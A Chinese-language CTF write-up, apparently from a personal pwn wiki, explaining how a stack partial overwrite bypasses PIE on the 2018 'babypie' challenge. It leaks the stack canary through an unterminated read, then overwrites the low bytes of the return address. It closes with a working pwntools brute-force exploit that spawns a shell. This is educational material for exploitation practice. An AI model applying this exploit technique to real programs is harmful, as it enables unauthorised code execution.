---
title: 花式栈溢出- 栈上的partial overwrite
date:  2020-07-08 19:41:59
updated: 2020-07-08 19:41:59
tags:
    - 花式栈溢出
    - wiki
    - pwn
categories: 
	- 二进制安全
	- wiki-pwn
use:
  - Valine
text: true
lazyload: true
count: true
---
# 1.原理

在程序开启了 PIE 保护时 (PIE enabled) 高位的地址会发生随机化, 但低位的偏移是始终固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。

# 2.查看

安恒杯 2018 年 7 月月赛的 babypie 

![image.png](https://i.loli.net/2020/11/17/NCsfJIxtRbmuSqK.png)

# 3.ida分析

![image.png](https://i.loli.net/2020/11/17/YPAFOBgipRvmh1x.png)

![image.png](https://i.loli.net/2020/11/17/xp9zBZCbjaIP8yF.png)

栈溢出，有后门函数，但保护全开...

首先leak canary

在第一次 read 之后紧接着就有一个输出, 而 read 并不会给输入的末尾加上 \0, 这就给了我们 leak 栈上内容的机会, 为了第二次溢出能控制返回地址, 我们选择 leak canary. 可以计算出第一次 read 需要的长度为 0x30 - 0x8 + 1 (+ 1 是为了覆盖 canary 的最低位为非 0 的值, printf 使用 %s 时, 遇到 \0 结束, 覆盖 canary 低位为非 0 值时, canary 就可以被 printf 打印出来了)

canary 在 rbp - 0x8 的位置上,  这样只要接收 'a' * (0x30 - 0x8 + 1) 后的 7 位, 再加上最低位的 '\0', 我们就恢复出程序的 canary 了

然后覆盖返回地址

没改写的返回地址与 get shell 函数的地址只有低位的 16 bit 不同, 如果覆写低 16 bit 为 0x?A3E, 就有一定的几率 get shell

# 4.编写脚本

```python
#!/usr/bin/env python
#coding=utf-8
from pwn import *

while True:
    try:
        p = process("./babypie", timeout = 1)
        p.sendafter(":\n", 'a' * (0x30 - 0x8 + 1))
        p.recvuntil('a' * (0x30 - 0x8 + 1))
        canary = '\0' + p.recvn(7)
        success(canary.encode('hex'))

        
        p.sendafter(":\n", 'a' * (0x30 - 0x8) + canary + 'bbbbbbbb' + '\x3E\x0A')

        p.interactive()
    except Exception as e:
        p.close()
        print e
```